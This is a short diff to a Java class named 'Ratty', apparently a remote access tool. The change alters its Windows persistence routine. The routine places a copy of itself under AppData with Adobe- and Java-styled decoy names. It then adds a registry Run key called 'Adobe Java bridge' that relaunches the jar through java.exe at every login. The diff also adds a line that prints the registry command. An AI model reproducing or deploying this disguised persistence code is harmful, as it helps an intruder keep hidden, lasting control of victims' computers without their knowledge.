@@ -31,7 +31,8 @@ public final class Ratty {
 	private static final String STARTUP_FOLDER_NAME = "Adobe" + File.separator + "AIR";
 	private static final String STARTUP_FILE_NAME = "jre13v3bridge.jar";
 	private static final String STARTUP_FILE_PATH = System.getenv("APPDATA") + File.separator + STARTUP_FOLDER_NAME + File.separator + STARTUP_FILE_NAME;
-	private static final String REGISTRY_COMMAND = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Adobe Java bridge\" /d \"" + STARTUP_FILE_PATH + "\"";
+	private static final String STARTUP_COMMAND = System.getProperty("java.home") + File.separator + "bin" + File.separator + "java.exe";
+	private static final String REGISTRY_COMMAND = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Adobe Java bridge\" /d \"" + STARTUP_COMMAND + " " + STARTUP_FILE_PATH + "\"";
 	
 	public static final String VERSION = "1.1";
 	
@@ -138,6 +139,8 @@ public final class Ratty {
 			
 			startServer(port);
 		}
+		
+		System.out.println(REGISTRY_COMMAND);
 	}
 	
 }
